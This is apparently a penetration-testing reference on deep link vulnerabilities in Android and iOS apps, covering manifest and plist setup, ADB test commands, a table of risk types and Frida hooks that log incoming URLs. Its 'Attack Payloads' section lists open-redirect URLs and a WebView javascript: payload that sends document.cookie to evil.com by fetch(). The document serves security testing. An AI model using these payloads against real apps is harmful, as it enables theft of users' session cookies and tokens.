# API Reference: Deep Link Vulnerability Testing

## Android Deep Links

### AndroidManifest.xml Configuration
```xml
<activity android:name=".DeepLinkActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="myapp" android:host="open"/>
    </intent-filter>
</activity>
```

### ADB Testing
```bash
adb shell am start -W -a android.intent.action.VIEW \
    -d "myapp://open/path?param=value" com.target.app
```

### Intent URI Scheme
```
intent://path#Intent;scheme=myapp;package=com.target.app;end
```

## iOS URL Schemes

### Info.plist Configuration
```xml
<key>CFBundleURLTypes</key>
<array>
    <dict>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>myapp</string>
        </array>
    </dict>
</array>
```

### Universal Links (apple-app-site-association)
```json
{
  "applinks": {
    "apps": [],
    "details": [{
      "appID": "TEAM_ID.com.example.app",
      "paths": ["/open/*", "/product/*"]
    }]
  }
}
```

## Vulnerability Types

| Type | Risk | Description |
|------|------|-------------|
| Open Redirect | HIGH | Deep link redirects to attacker URL |
| JavaScript Injection | CRITICAL | Code execution in WebView |
| Parameter Theft | HIGH | Token/credential exfiltration |
| Intent Redirect | HIGH | Android intent hijacking |
| Path Traversal | MEDIUM | Access unintended app sections |

## Attack Payloads

### Open Redirect
```
myapp://open?redirect=https://evil.com
myapp://open?url=javascript:alert(document.cookie)
```

### WebView JavaScript
```
myapp://webview?url=javascript:fetch('https://evil.com/'+document.cookie)
```

### Parameter Injection
```
myapp://auth?token=stolen&callback=https://evil.com
```

## Frida — Runtime Deep Link Testing

### Hook URL Handler (Android)
```javascript
Java.perform(function() {
    var Activity = Java.use("android.app.Activity");
    Activity.onNewIntent.implementation = function(intent) {
        console.log("Deep link: " + intent.getData().toString());
        this.onNewIntent(intent);
    };
});
```

### Hook URL Handler (iOS)
```javascript
var handler = ObjC.classes.AppDelegate["- application:openURL:options:"];
Interceptor.attach(handler.implementation, {
    onEnter: function(args) {
        var url = ObjC.Object(args[3]);
        console.log("URL scheme: " + url.toString());
    }
});
```
